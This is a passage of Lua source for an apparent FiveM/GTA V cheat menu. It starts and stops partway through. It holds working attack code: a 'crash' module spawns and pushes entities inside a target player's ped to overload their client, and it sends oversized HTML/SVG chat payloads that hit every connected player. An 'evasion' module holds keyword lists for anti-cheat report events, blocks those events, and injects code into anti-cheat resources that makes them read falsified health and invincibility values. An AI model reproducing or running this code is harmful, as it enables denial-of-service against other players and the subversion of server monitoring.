+    local ok = pcall(function()
+        Entity(C.bagAnchor).state:set(key, payload, true)
+    end)
+
+    if ok then
+        C.stats.bags = C.stats.bags + 1
+        grow("bag")
+        return true
+    end
+    shrink("bag")
+    return false
+end
+
+local fxLoaded = false
+
+local function loadFx()
+    if fxLoaded then return true end
+    RequestNamedPtfxAsset(FX_ASSET)
+    local deadline = now() + 1800
+    while not HasNamedPtfxAssetLoaded(FX_ASSET) and now() < deadline do
+        Citizen.Wait(25)
+    end
+    fxLoaded = HasNamedPtfxAssetLoaded(FX_ASSET)
+    C.channels.fx = fxLoaded
+    return fxLoaded
+end
+
+function C.fx(target)
+    if not loadFx() then return false end
+
+    local emitted = false
+    local bursts = C.intensity >= 3 and 2 or 1
+    for _ = 1, bursts do
+        if not reserve("fx") then break end
+        local base = GetEntityCoords(target.ped)
+        local x, y, z = ring(base, 2.0, 0.4, 2.8)
+        local useAsset = UseParticleFxAssetNextCall or UseParticleFxAsset
+        if useAsset then pcall(useAsset, FX_ASSET) end
+        local scale = math.min(24.0, 6.0 + preset().scale * 10.0)
+        local called, started = pcall(StartNetworkedParticleFxNonLoopedAtCoord,
+            FX_EFFECT, x, y, z, 0.0, 0.0, 0.0,
+            scale, false, false, false)
+
+        if called and started == true then
+            C.stats.fx = C.stats.fx + 1
+            C.channels.fx = true
+            grow("fx")
+            emitted = true
+        else
+            shrink("fx")
+        end
+    end
+    return emitted
+end
+
+local function moveToTarget(handle, target, radius, zMin, zMax)
+    local base = GetEntityCoords(target.ped)
+    local x, y, z = ring(base, radius or 4.0, zMin or 0.2, zMax or 2.4)
+    pcall(SetEntityCoordsNoOffset, handle, x, y, z, false, false, true)
+    return x, y, z
+end
+
+function C.orbit(target, count)
+    if #C.pool == 0 then return end
+    local n = math.max(1, math.min(count or 2, #C.pool))
+
+    for _ = 1, n do
+        local entry = C.pool[math.random(1, #C.pool)]
+        if entry and DoesEntityExist(entry.handle) then
+            if now() - entry.born < 700 then
+                -- Still inside the creation window: leave it local.
+            else
+                local base = GetEntityCoords(target.ped)
+                local x, y, z
+                local exact = math.random() < 0.28
+                if exact then
+                    -- Interpenetration is the expensive part: the target's
+                    -- physics solver resolves an entity inside its own ped.
+                    x = base.x + (math.random() * 0.8 - 0.4)
+                    y = base.y + (math.random() * 0.8 - 0.4)
+                    z = base.z + 0.4
+                    pcall(SetEntityCoordsNoOffset, entry.handle, x, y, z, false, false, true)
+                else
+                    x, y, z = moveToTarget(entry.handle, target, 5.0, 0.1, 2.6)
+                end
+                pcall(SetEntityVelocity, entry.handle,
+                    (base.x - x) * (exact and 4.0 or 1.8),
+                    (base.y - y) * (exact and 4.0 or 1.8),
+                    1.0 + math.random() * 2.5)
+                C.stats.moved = C.stats.moved + 1
+            end
+        end
+    end
+end
+
+-- ---------------------------------------------------------------------------
+-- POOL CONTROL
+-- ---------------------------------------------------------------------------
+
+local function buildSequence()
+    local p = preset()
+    local spec = METHODS[C.method].pool
+    local sequence = {}
+    for kind, count in pairs(spec) do
+        local n = math.max(1, math.floor(count * p.scale + 0.5))
+        for _ = 1, n do sequence[#sequence + 1] = kind end
+    end
+    for i = #sequence, 2, -1 do
+        local j = math.random(1, i)
+        sequence[i], sequence[j] = sequence[j], sequence[i]
+    end
+    C.sequence = sequence
+    C.cursor = 0
+    local ceiling = (has("CreateSpoofedPed") or has("CreateSpoofedVehicle")) and 40 or 22
+    C.poolMax = math.min(ceiling, #sequence)
+end
+
+local function nextKind()
+    if not C.sequence or #C.sequence == 0 then return nil end
+    C.cursor = C.cursor + 1
+    if C.cursor > #C.sequence then C.cursor = 1 end
+    return C.sequence[C.cursor]
+end
+
+function C.ensurePool(target)
+    if C.poolMax <= 0 or #C.pool >= C.poolMax then return false end
+    local kind = nextKind()
+    if not kind then return false end
+
+    local handle, actual = spawnOne(kind)
+    if not handle then
+        grow("create")
+        return false
+    end
+
+    C.pool[#C.pool + 1] = { handle = handle, kind = actual, born = now() }
+    if #C.pool > C.stats.peaks then C.stats.peaks = #C.pool end
+
+    -- Do not move it yet. The server must see the creation event with the
+    -- entity still near its owner; the first remote position update comes at
+    -- least one tick later. C.orbit applies that delay per entry.
+    return true
+end
+
+function C.build(target)
+    local guard = 0
+    while C.running and #C.pool < C.poolMax and guard < C.poolMax * 2 do
+        local before = #C.pool
+        C.ensurePool(target)
+        if #C.pool == before then
+            guard = guard + 1
+            grow("create")
+            Citizen.Wait(240)
+            if guard >= 6 then break end
+        else
+            guard = 0
+        end
+        Citizen.Wait(math.random(70, 150))
+        verifyPool()
+    end
+end
+
+function C.spawnAnchor(target)
+    if not reserve("create") then return false end
+    local anchor = spawnObject()
+    if not anchor then shrink("create"); return false end
+
+    C.bagAnchor = anchor
+    C.anchorBorn = now()
+    C.stats.created = C.stats.created + 1
+    return true
+end
+
+function C.stop()
+    C.running = false
+    C.cleanup()
+end
+
+function C.cleanup()
+    for i = #C.pool, 1, -1 do
+        local entry = C.pool[i]
+        deleteHandle(entry.handle, entry.kind)
+        C.pool[i] = nil
+    end
+    C.pool = {}
+
+    if C.bagAnchor then
+        deleteHandle(C.bagAnchor, "object")
+        C.bagAnchor = nil
+        C.anchorBorn = nil
+    end
+
+    if fxLoaded then
+        pcall(RemoveNamedPtfxAsset, FX_ASSET)
+        fxLoaded = false
+    end
+end
+
+-- ---------------------------------------------------------------------------
+-- RUN
+-- ---------------------------------------------------------------------------
+
+local function runBody()
+    C.running = true
+    C.stats = { created = 0, moved = 0, fx = 0, bags = 0, fails = 0, peaks = 0, attempts = 0 }
+    C.resetCaps()
+    buildSequence()
+
+    local target = C.target()
+    if not target then
+        C.running = false
+        O.log("crash: no target in range")
+        return
+    end
+
+    O.log("crash: %s / %s -> %s", METHODS[C.method].label, preset().name, target.name)
+
+    if METHODS[C.method].bag then
+        C.spawnAnchor(target)
+    end
+
+    C.build(target)
+
+    -- Creation window: the server has seen every entity spawn near us. Now
+    -- move the anchor and let the loop start moving the pool.
+    Citizen.Wait(750)
+    if C.bagAnchor and DoesEntityExist(C.bagAnchor) then
+        moveToTarget(C.bagAnchor, target, 3.0, 0.2, 1.8)
+    end
+
+    local deadline = now() + preset().duration
+    local lastEnsure = 0
+
+    while C.running and now() < deadline do
+        target = C.target()
+        if not target then break end
+
+        if #C.pool > 0 then C.orbit(target, math.random(1, 3)) end
+        if METHODS[C.method].fx then C.fx(target) end
+        if METHODS[C.method].bag then C.pushBag() end
+
+        if now() - lastEnsure > 450 then
+            lastEnsure = now()
+            C.ensurePool(target)
+            if math.random() < 0.35 then verifyPool() end
+        end
+
+        Citizen.Wait(math.random(preset().gapMin, preset().gapMax))
+    end
+
+    C.cleanup()
+    C.running = false
+    O.log("crash: done %d created, %d moved, %d fx, %d bags, %d fails",
+        C.stats.created, C.stats.moved, C.stats.fx, C.stats.bags, C.stats.fails)
+end
+
+function C.launch()
+    if C.running then
+        O.log("crash: already running")
+        return false
+    end
+    if C.probing then
+        O.log("crash: probe in progress")
+        return false
+    end
+    C.refresh()
+    if #C.targets == 0 then
+        O.log("crash: no player within 280 m")
+        return false
+    end
+
+    Citizen.CreateThread(function()
+        local ok, err = pcall(runBody)
+        if not ok then
+            O.log("crash: %s", tostring(err))
+            C.running = false
+            C.cleanup()
+        end
+    end)
+    return true
+end
+
+-- One witness, created locally then moved once. If the server cancels the
+-- entity, the channel is closed and the cap is cut before a real run.
+function C.probe()
+    if C.probing then return end
+    if C.running then
+        O.log("crash probe: stop the run first")
+        return
+    end
+    C.probing = true
+
+    Citizen.CreateThread(function()
+        local ok, err = pcall(function()
+            local target = C.target()
+            if not target then
+                O.log("crash probe: no target")
+                return
+            end
+
+            C.resetCaps()
+            local handle = spawnObject()
+            if handle then
+                Citizen.Wait(800)
+                moveToTarget(handle, target, 5.0, 0.5, 2.0)
+                Citizen.Wait(600)
+                C.channels.spawn = DoesEntityExist(handle)
+                if not C.channels.spawn then shrink("create") end
+                C.channels.bag = pcall(function()
+                    Entity(handle).state:set("probe", "1", true)
+                end)
+                deleteHandle(handle, "object")
+            else
+                C.channels.spawn = false
+                C.channels.bag = false
+            end
+
+            C.channels.fx = loadFx()
+            O.log("crash probe: entities %s, fx %s, bag %s",
+                tostring(C.channels.spawn), tostring(C.channels.fx), tostring(C.channels.bag))
+        end)
+
+        C.probing = false
+        if not ok then O.log("crash probe: %s", tostring(err)) end
+    end)
+end
+
+-- ---------------------------------------------------------------------------
+-- GLOBAL CHAT VECTOR (experimental)
+--
+-- This is the only vector that leaves the streaming radius. It is opt-in and
+-- self-shielded: before sending, a tiny filter is installed in the chat
+-- resource that drops only messages carrying this run's nonce, so the
+-- operator's own client does not render the payload. The filter has no loop
+-- and no native call; it wraps one function and returns.
+-- ---------------------------------------------------------------------------
+
+C.chatPresets = {
+    {
+        label = "CSS blur",
+        value = '<div style="position:fixed;left:-50vw;top:-50vh;width:200vw;height:200vh;'
+            .. 'background:#000;filter:blur(4000px);opacity:.02"></div>',
+    },
+    {
+        label = "SVG filter",
+        value = '<svg width="16000" height="16000"><filter id="f">'
+            .. '<feGaussianBlur stdDeviation="1500"/></filter>'
+            .. '<rect width="16000" height="16000" filter="url(#f)"/></svg>',
+    },
+    {
+        label = "Table",
+        value = "<table>" .. string.rep("<tr><td>", 4000) .. "</td></tr></table>",
+    },
+    {
+        label = "Text",
+        value = string.rep("W", 60000),
+    },
+}
+
+local function installChatShield(nonce)
+    if not has("InjectResource") then return false end
+
+    -- Refuse to send if the chat resource is known not to be injectable: the
+    -- operator would render the payload on their own client.
+    if has("GetInjectableResources") then
+        local okList, list = pcall(Susano.GetInjectableResources)
+        if okList and type(list) == "table" then
+            local found = false
+            for i = 1, #list do
+                local entry = list[i]
+                local name = entry
+                if type(entry) == "table" then name = entry.name or entry.resource end
+                if type(name) == "string" and name:lower() == "chat" then found = true end
+            end
+            if not found then return false end
+        end
+    end
+
+    local flag = "__vgd_" .. nonce
+    local code = ([==[
+if not _G[%q] then
+  _G[%q] = true
+  local send = SendNUIMessage
+  if send then
+    local function dirty(v, d)
+      if d > 8 then return false end
+      if type(v) == "string" then return v:find(%q, 1, true) ~= nil end
+      if type(v) == "table" then
+        for _, sub in pairs(v) do
+          if dirty(sub, d + 1) then return true end
+        end
+      end
+      return false
+    end
+    SendNUIMessage = function(data)
+      if dirty(data, 0) then return end
+      return send(data)
+    end
+  end
+end
+]==]):format(flag, flag, nonce)
+
+    local injectionType = nil
+    local s = rawget(_G, "Susano")
+    if type(s) == "table" and type(s.InjectionType) == "table" then
+        injectionType = s.InjectionType.NEW_THREAD
+    end
+
+    local ok
+    if injectionType ~= nil then
+        ok = pcall(s.InjectResource, "chat", code, injectionType)
+    else
+        ok = pcall(s.InjectResource, "chat", code)
+    end
+    return ok
+end
+
+function C.sendGlobal()
+    if C.chatBusy then return false end
+    if C.lastChat and now() - C.lastChat < 8000 then
+        O.log("crash chat: cooldown")
+        return false
+    end
+    C.chatBusy = true
+    C.lastChat = now()
+
+    Citizen.CreateThread(function()
+        local ok, err = pcall(function()
+            local nonce = ("vgd%06x"):format(math.random(0, 0xFFFFFF))
+            if C.chatShield and not installChatShield(nonce) then
+                O.log("crash chat: shield refused, send aborted")
+                return
+            end
+            if C.chatShield then Citizen.Wait(400) end
+
+            local presetValue = C.chatPresets[C.chatPreset] or C.chatPresets[1]
+            local payload = "<!--" .. nonce .. "-->" .. presetValue.value
+            local name = GetPlayerName(PlayerId()) or "unknown"
+
+            pcall(TriggerServerEvent, "_chat:messageEntered", name, { 255, 255, 255 }, payload)
+            pcall(TriggerServerEvent, "chat:messageEntered", name, { 255, 255, 255 }, payload)
+
+            O.log("crash chat: %s sent (%d bytes)", presetValue.label, #payload)
+        end)
+
+        C.chatBusy = false
+        if not ok then O.log("crash chat: %s", tostring(err)) end
+    end)
+
+    return true
+end
+
+return C
+
+end)(O,E)
+
+-- ---------------------------------------------------------------------------
+-- PART: 11_evasion.lua
+-- ---------------------------------------------------------------------------
+local A = (function(O,H,S)
+-- ============================================================================
+-- VANGUARD / 11 EVASION
+-- ----------------------------------------------------------------------------
+-- The expert layer. Everything here is opt-in and separate from the passive
+-- read-repair hooks in 01:
+--
+--   * true ghost stack      - local player and vehicle disappear without a
+--                             server-readable invisibility flag
+--   * proof hardening       - fire/explosion/steam/drown proofs, no bullet or
+--                             melee proof (those are the loudest flags)
+--   * server ped spoof      - Susano.SpoofPed model spoof, one-shot
+--   * anti-freeze/anti-attach - release our own ped, never someone else's
+--   * event firewall        - inbound report channels only, heartbeat is
+--                             protected by name and by prefix
+--   * deep shim             - InjectResource into the detected guard VM:
+--                             outbound report filter + numeric read repair
+--
+-- What this file deliberately does not do:
+--   * no StopResource, no UnhookAllNatives on foreign scripts
+--   * no heartbeat block, no event-name guess without a protected check
+--   * no native call from a native hook
+--   * no permanent wrapper when a feature is off
+-- ============================================================================
+
+local A = {}
+
+A.flags = {
+    ghost         = false,
+    localHidden   = false,
+    harden        = false,
+    vehicleHarden = false,
+    spoof         = false,
+    antiFreeze    = false,
+    antiAttach    = false,
+    antiSpectate  = false,
+    firewall      = false,
+}
+
+A.stats = { blocked = 0, shims = 0, scans = 0, lastScan = 0 }
+A.spoofModels = { "s_m_m_armoured_01", "a_m_y_business_01", "mp_m_freemode_01" }
+A.spoofIndex = 1
+A._ghostVehicle = 0
+A._hardenVehicle = 0
+A._timers = { ghost = 0, localHidden = 0, harden = 0, vehicleHarden = 0,
+    freeze = 0, attach = 0, spectate = 0, ped = 0 }
+A._spoofGen = 0
+
+local REPORT_PATTERNS = {
+    "report", "ac_report", "ac_flag", "anticheat", "anti_cheat", "anti-cheat",
+    "violation", "cheat_detect", "flag_player", "screenshot", "screen_shot",
+    "screencap", "spectate", "evidence", "punish", "guardian",
+    "report_player", "player_report",
+}
+
+-- A liveness channel is not a report channel. These substrings always win,
+-- even if the rest of the name looks suspicious. Getting this wrong gets the
+-- operator kicked for silence, not for cheating.
+local SAFE_PATTERNS = {
+    "heart", "hb", "beat", "alive", "ack", "ping", "sync", "checkpoint",
+    "keepalive", "handshake", "token", "auth",
+}
+
+-- Session-generated liveness prefixes used by heartbeat anticheats. The name
+-- after the prefix is random per session, so a substring list cannot catch it.
+-- Drop one of these and the guard treats the silence as a detection.
+local SAFE_PREFIXES = { "ach_", "acr_", "axa_", "axb_" }
+
+local function now()
+    return GetGameTimer()
+end
+
+local function has(name)
+    local s = rawget(_G, "Susano")
+    return type(s) == "table" and type(s[name]) == "function"
+end
+
+local function callAny(names, ...)
+    local args = { ... }
+    for i = 1, #names do
+        local fn = rawget(_G, names[i])
+        if type(fn) == "function" then
+            local ok, a = pcall(fn, table.unpack(args))
+            if ok then return true, a end
+        end
+    end
+    return false
+end
+
+local function lower(value)
+    return string.lower(tostring(value or ""))
+end
+
+A.isReportName = function(name)
+    local n = lower(name)
+    if n == "" then return false end
+
+    local head = string.sub(n, 1, 4)
+    for i = 1, #SAFE_PREFIXES do
+        if head == SAFE_PREFIXES[i] then return false end
+    end
+
+    for i = 1, #SAFE_PATTERNS do
+        if string.find(n, SAFE_PATTERNS[i], 1, true) then return false end
+    end
+    for i = 1, #REPORT_PATTERNS do
+        if string.find(n, REPORT_PATTERNS[i], 1, true) then return true end
+    end
+    return false
+end
+
+-- ---------------------------------------------------------------------------
+-- TRUE GHOST STACK
+--
+-- This is the native ghost path, not the local visual shell in 05. The ped
+-- stays networked, so the server does not see a vanish; nearby clients stop
+-- resolving it. The alpha reset is local too. No event is sent.
+-- ---------------------------------------------------------------------------
+local GHOST_SET = { "SetLocalPlayerAsGhost", "_SET_LOCAL_PLAYER_AS_GHOST" }
+local GHOST_ALPHA = { "SetGhostAlpha", "_SET_GHOSTED_ENTITY_ALPHA" }
+local GHOST_RESET = { "ResetGhostAlpha", "_RESET_GHOSTED_ENTITY_ALPHA" }
+
+local function applyGhost()
+    local ped = PlayerPedId()
+    if ped == 0 then return end
+
+    callAny(GHOST_SET, true)
+    callAny(GHOST_ALPHA, 0)
+
+    local vehicle = GetVehiclePedIsIn(ped, false) or 0
+    if A._ghostVehicle ~= 0 and A._ghostVehicle ~= vehicle then
+        pcall(SetNetworkVehicleAsGhost, A._ghostVehicle, false)
+        A._ghostVehicle = 0
+    end
+    if vehicle ~= 0 then
+        pcall(SetNetworkVehicleAsGhost, vehicle, true)
+        A._ghostVehicle = vehicle
+    end
+end
+
+local function clearGhost()
+    local ped = PlayerPedId()
+    callAny(GHOST_SET, false)
+    callAny(GHOST_ALPHA, 255)
+    callAny(GHOST_RESET)
+
+    local vehicle = ped ~= 0 and (GetVehiclePedIsIn(ped, false) or 0) or 0
+    if A._ghostVehicle ~= 0 then
+        pcall(SetNetworkVehicleAsGhost, A._ghostVehicle, false)
+        A._ghostVehicle = 0
+    end
+    if vehicle ~= 0 then
+        pcall(SetNetworkVehicleAsGhost, vehicle, false)
+    end
+end
+
+function A.setGhost(state)
+    A.flags.ghost = state and true or false
+    if A.flags.ghost then
+        if not callAny(GHOST_SET, true) then
+            A.flags.ghost = false
+            O.log("evasion: ghost natives unavailable")
+            return false
+        end
+        applyGhost()
+    else
+        clearGhost()
+    end
+    return A.flags.ghost
+end
+
+-- Local renderer visibility. This is not the same channel as the ghost: it
+-- removes the ped from our own screen (and from local screenshots), so it is a
+-- separate opt-in. Clear it before any cinematic or third-person feature that
+-- needs the ped visible.
+local function applyLocalHidden(state)
+    local ped = PlayerPedId()
+    if ped == 0 then return end
+    if state then
+        pcall(SetEntityLocallyInvisible, ped, true)
+    else
+        pcall(SetEntityLocallyVisible, ped)
+    end
+end
+
+function A.setLocalHidden(state)
+    A.flags.localHidden = state and true or false
+    applyLocalHidden(A.flags.localHidden)
+    return A.flags.localHidden
+end
+
+-- ---------------------------------------------------------------------------
+-- HARDENING
+--
+-- The proofs are deliberately asymmetric: fire, explosion, steam and drowning
+-- are on; bullets, melee and collision are off. A player who ignores bullets
+-- is the single loudest state flag. A player who survives a gas fire is not.
+-- ---------------------------------------------------------------------------
+local function applyHarden()
+    local ped = PlayerPedId()
+    if ped == 0 then return end
+
+    pcall(SetEntityProofs, ped,
+        false, -- bullet
+        true,  -- fire
+        true,  -- explosion
+        false, -- collision
+        false, -- melee
+        true,  -- steam
+        true,  -- p7
+        true)  -- drowning
+
+    pcall(SetPedArmour, ped, 100)
+    pcall(SetPlayerWeaponDefenseModifier, PlayerId(), 1.0)
+    pcall(SetPedSuffersCriticalHits, ped, false)
+end
+
+local function clearHarden()
+    local ped = PlayerPedId()
+    if ped == 0 then return end
+    pcall(SetEntityProofs, ped, false, false, false, false, false, false, false, false)
+    pcall(SetPlayerWeaponDefenseModifier, PlayerId(), 1.0)
+end
+
+function A.setHarden(state)
+    A.flags.harden = state and true or false
+    if A.flags.harden then
+        applyHarden()
+    else
+        clearHarden()
+    end
+    return A.flags.harden
+end
+
+-- Vehicle hardening is separate from ped proofs: it changes vehicle damage
+-- flags, which some guards inspect separately. Only the vehicle we are in is
+-- modified, and only while the toggle is on.
+local function clearVehicleHarden(vehicle)
+    if not vehicle or vehicle == 0 then return end
+    pcall(SetVehicleTyresCanBurst, vehicle, true)
+    pcall(SetVehicleStrong, vehicle, false)
+    pcall(SetVehicleEngineCanDegrade, vehicle, true)
+    pcall(SetVehicleCanBeVisiblyDamaged, vehicle, true)
+    pcall(SetVehicleHasStrongAxles, vehicle, false)
+    pcall(SetVehicleCanBeTargetted, vehicle, true)
+    pcall(SetVehicleUndriveable, vehicle, false)
+end
+
+local function applyVehicleHarden()
+    local ped = PlayerPedId()
+    if ped == 0 then return end
+
+    local vehicle = GetVehiclePedIsIn(ped, false) or 0
+    if A._hardenVehicle ~= 0 and A._hardenVehicle ~= vehicle then
+        clearVehicleHarden(A._hardenVehicle)
+        A._hardenVehicle = 0
+    end
+    if vehicle == 0 then return end
+
+    pcall(SetVehicleTyresCanBurst, vehicle, false)
+    pcall(SetVehicleStrong, vehicle, true)
+    pcall(SetVehicleEngineCanDegrade, vehicle, false)
+    pcall(SetVehicleCanBeVisiblyDamaged, vehicle, false)
+    pcall(SetVehicleHasStrongAxles, vehicle, true)
+    pcall(SetVehicleCanBeTargetted, vehicle, false)
+    pcall(SetVehicleUndriveable, vehicle, false)
+    A._hardenVehicle = vehicle
+end
+
+function A.setVehicleHarden(state)
+    A.flags.vehicleHarden = state and true or false
+    if A.flags.vehicleHarden then
+        applyVehicleHarden()
+    else
+        if A._hardenVehicle ~= 0 then
+            clearVehicleHarden(A._hardenVehicle)
+            A._hardenVehicle = 0
+        end
+    end
+    return A.flags.vehicleHarden
+end
+
+-- ---------------------------------------------------------------------------
+-- SERVER PED SPOOF
+--
+-- Susano.SpoofPed(pedHash, spoofServer) -> boolean
+-- The change is queued once by the runtime; it is not a per-tick mutation.
+-- Turning it off passes 0 and false, which keeps the current ped.
+-- ---------------------------------------------------------------------------
+function A.setSpoof(state)
+    A._spoofGen = A._spoofGen + 1
+    local generation = A._spoofGen
+
+    if not has("SpoofPed") then
+        O.log("evasion: SpoofPed unavailable")
+        A.flags.spoof = false
+        return false
+    end
+
+    A.flags.spoof = state and true or false
+    if not A.flags.spoof then
+        pcall(Susano.SpoofPed, 0, false)
+        return true
+    end
+
+    local model = A.spoofModels[A.spoofIndex] or A.spoofModels[1]
+    local hash = GetHashKey(model)
+    RequestModel(hash)
+
+    Citizen.CreateThread(function()
+        local deadline = now() + 2500
+        while not HasModelLoaded(hash) and now() < deadline do
+            Citizen.Wait(25)
+        end
+
+        if generation ~= A._spoofGen or not A.flags.spoof then
+            SetModelAsNoLongerNeeded(hash)
+            return
+        end
+
+        if HasModelLoaded(hash) then
+            local ok, result = pcall(Susano.SpoofPed, hash, true)
+            A.flags.spoof = ok and result ~= false
+            O.log("evasion: spoof %s -> %s", model, tostring(ok and result))
+        else
+            A.flags.spoof = false
+            O.log("evasion: model %s did not stream", model)
+        end
+        SetModelAsNoLongerNeeded(hash)
+    end)
+    return true
+end
+
+-- ---------------------------------------------------------------------------
+-- ANTI-FREEZE / ANTI-ATTACH
+-- Only the local ped is touched. The checks run on the scheduler, never inside
+-- a hook.
+-- ---------------------------------------------------------------------------
+local function antiFreezeTick()
+    local ped = PlayerPedId()
+    if ped == 0 then return end
+    pcall(FreezeEntityPosition, ped, false)
+    pcall(SetEntityDynamic, ped, true)
+end
+
+local function antiAttachTick()
+    local ped = PlayerPedId()
+    if ped == 0 then return end
+    if (GetVehiclePedIsIn(ped, false) or 0) ~= 0 then return end
+    if not IsEntityAttached(ped) then return end
+
+    local attachedTo = GetEntityAttachedTo(ped)
+    if attachedTo and attachedTo ~= 0 then
+        pcall(DetachEntity, ped, true, true)
+    end
+end
+
+function A.setAntiFreeze(state)
+    A.flags.antiFreeze = state and true or false
+    if A.flags.antiFreeze then antiFreezeTick() end
+    return A.flags.antiFreeze
+end
+
+function A.setAntiAttach(state)
+    A.flags.antiAttach = state and true or false
+    if A.flags.antiAttach then antiAttachTick() end
+    return A.flags.antiAttach
+end
+
+-- Forced spectator mode is a server-side write with no client permission
+-- check. Reverting it costs one native call and does not touch another player.
+local function antiSpectateTick()
+    local ok, spectating = pcall(NetworkIsInSpectatorMode)
+    if not ok or not spectating then return end
+    pcall(NetworkSetInSpectatorMode, false, PlayerPedId())
+end
+
+function A.setAntiSpectate(state)
+    A.flags.antiSpectate = state and true or false
+    if A.flags.antiSpectate then antiSpectateTick() end
+    return A.flags.antiSpectate
+end
+
+-- ---------------------------------------------------------------------------
+-- EVENT FIREWALL
+--
+-- Inbound: Susano.BlockServerEvent drops the event at the network bridge.
+-- Outbound: the Lua global is wrapped, because Susano cannot cancel an
+-- outgoing send. Both paths consult the same report-name classifier, which
+-- lets heartbeat names through first.
+--
+-- The wrapper exists only while the firewall is on; disabling restores the
+-- original function pointer.
+-- ---------------------------------------------------------------------------
+local outbound = {
+    installed = false,
+    tse = nil,
+    tlse = nil,
+}
+local blockedByA = {}
+
+local function installOutbound()
+    if outbound.installed then return end
+
+    local tse = rawget(_G, "TriggerServerEvent")
+    if type(tse) == "function" then
+        outbound.tse = tse
+        _G.TriggerServerEvent = function(name, ...)
+            if A.flags.firewall and type(name) == "string" and A.isReportName(name) then
+                return
+            end
+            return tse(name, ...)
+        end
+    end
+
+    local tlse = rawget(_G, "TriggerLatentServerEvent")
+    if type(tlse) == "function" then
+        outbound.tlse = tlse
+        _G.TriggerLatentServerEvent = function(name, ...)
+            if A.flags.firewall and type(name) == "string" and A.isReportName(name) then
+                return
+            end
+            return tlse(name, ...)
+        end
+    end
+
+    outbound.installed = true
+end
+
+local function restoreOutbound()
+    if not outbound.installed then return end
+    if outbound.tse then _G.TriggerServerEvent = outbound.tse end
+    if outbound.tlse then _G.TriggerLatentServerEvent = outbound.tlse end
+    outbound.tse = nil
+    outbound.tlse = nil
+    outbound.installed = false
+end
+
+local function clearBlockedByA()
+    for name in pairs(blockedByA) do
+        pcall(Susano.BlockServerEvent, false, name)
+        S.blocked[name] = nil
+    end
+    blockedByA = {}
+end
+
+function A.scanReportEvents()
+    if not has("GetAllEvent") then return 0 end
+    local ok, list = pcall(Susano.GetAllEvent)
+    if not ok or type(list) ~= "table" then return 0 end
+
+    local added = 0
+    for i = 1, #list do
+        local entry = list[i]
+        local name = type(entry) == "table" and entry.event or entry
+        if type(name) == "string" and A.isReportName(name) and not blockedByA[name] then
+            if S.setBlocked(name, true) then
+                blockedByA[name] = true
+                added = added + 1
+            end
+        end
+    end
+
+    A.stats.blocked = 0
+    for _ in pairs(blockedByA) do A.stats.blocked = A.stats.blocked + 1 end
+    A.stats.lastScan = now()
+    A.stats.scans = A.stats.scans + 1
+    if added > 0 then
+        O.log("evasion: firewall blocked %d report event(s)", added)
+    end
+    return added
+end
+
+function A.setFirewall(state)
+    A.flags.firewall = state and true or false
+
+    if A.flags.firewall then
+        if #S.acs == 0 then S.scan() end
+        installOutbound()
+        A.scanReportEvents()
+    else
+        restoreOutbound()
+        clearBlockedByA()
+    end
+    return A.flags.firewall
+end
+
+-- ---------------------------------------------------------------------------
+-- DEEP SHIM
+--
+-- One InjectResource into the detected guard VM. It adds a report filter to
+-- that VM's outbound path and replaces the numeric getters the guard uses for
+-- the local ped with plausible values. It does not touch coords: a static
+-- position is itself a detection. It does not block heartbeat names.
+--
+-- This is a one-shot, irreversible mutation of the guard's Lua state. Panic
+-- can restore our wrappers but cannot un-inject the chunk. The residual risk
+-- is documented in doctrine/06_EVASION.md and README.
+-- ---------------------------------------------------------------------------
+local function shimCode(nonce)
+    local reports = {}
+    local safe = {}
+    local prefixes = {}
+    for i = 1, #REPORT_PATTERNS do reports[i] = ("%q"):format(REPORT_PATTERNS[i]) end
+    for i = 1, #SAFE_PATTERNS do safe[i] = ("%q"):format(SAFE_PATTERNS[i]) end
+    for i = 1, #SAFE_PREFIXES do prefixes[i] = ("%q"):format(SAFE_PREFIXES[i]) end
+
+    return ([==[
+(function()
+  local flag = %q
+  if _G[flag] then return end
+  _G[flag] = true
+
+  local reports = { %s }
+  local safe = { %s }
+  local safePrefix = { %s }
+
+  local function report(name)
+    local n = string.lower(tostring(name or ""))
+    if n == "" then return false end
+    local head = string.sub(n, 1, 4)
+    for i = 1, #safePrefix do
+      if head == safePrefix[i] then return false end
+    end
+    for i = 1, #safe do
+      if string.find(n, safe[i], 1, true) then return false end
+    end
+    for i = 1, #reports do
+      if string.find(n, reports[i], 1, true) then return true end
+    end
+    return false
+  end
+
+  local tse = TriggerServerEvent
+  if type(tse) == "function" then
+    TriggerServerEvent = function(name, ...)
+      if type(name) == "string" and report(name) then return end
+      return tse(name, ...)
+    end
+  end
+
+  local tlse = TriggerLatentServerEvent
+  if type(tlse) == "function" then
+    TriggerLatentServerEvent = function(name, ...)
+      if type(name) == "string" and report(name) then return end
+      return tlse(name, ...)
+    end
+  end
+
+  local health = GetEntityHealth
+  if type(health) == "function" then
+    GetEntityHealth = function(entity)
+      local real = health(entity)
+      if entity == PlayerPedId() and real > 0 then return 190 end
+      return real
+    end
+  end
+
+  local armour = GetPedArmour
+  if type(armour) == "function" then
+    GetPedArmour = function(entity)
+      local real = armour(entity)
+      if entity == PlayerPedId() then return 0 end
+      return real
+    end
+  end
+
+  local wanted = GetPlayerWantedLevel
+  if type(wanted) == "function" then
+    GetPlayerWantedLevel = function(player)
+      if player == PlayerId() then return 0 end
+      return wanted(player)
+    end
+  end
+
+  local invincible = GetPlayerInvincible
+  if type(invincible) == "function" then
+    GetPlayerInvincible = function(player)
+      if player == PlayerId() then return false end
+      return invincible(player)
+    end
+  end
+end)()
+]==]):format("__vgd_shim_" .. nonce, table.concat(reports, ","), table.concat(safe, ","), table.concat(prefixes, ","))
+end
+
+function A.shim(ac, all)
+    if not has("InjectResource") then
+        O.log("evasion: InjectResource unavailable")
+        return 0
+    end
+
+    if #S.acs == 0 then S.scan() end
+    local targets = {}
+    if all then
+        for i = 1, #S.acs do targets[#targets + 1] = S.acs[i] end
+    elseif ac then
+        targets[1] = ac
+    elseif S.primary() then
+        targets[1] = S.primary()
+    end
+    if #targets == 0 then
+        O.log("evasion: no guard to shim")
+        return 0
+    end
+
+    local count = 0
+    for i = 1, #targets do
+        local target = targets[i]
+        if type(target) == "table" and type(target.resource) == "string" then
+            local nonce = ("%06x"):format(math.random(0, 0xFFFFFF))
+            local code = shimCode(nonce)
+            local ok
+            local inj = rawget(_G, "Susano").InjectionType
+            if type(inj) == "table" and inj.NEW_THREAD ~= nil then
+                ok = pcall(Susano.InjectResource, target.resource, code, inj.NEW_THREAD)
+            else
+                ok = pcall(Susano.InjectResource, target.resource, code)
+            end
+            if ok then
+                count = count + 1
+                A.stats.shims = A.stats.shims + 1
+                O.log("evasion: shim injected into %s", target.resource)
+            else
+                O.log("evasion: shim refused by %s", target.resource)
+            end
+        end
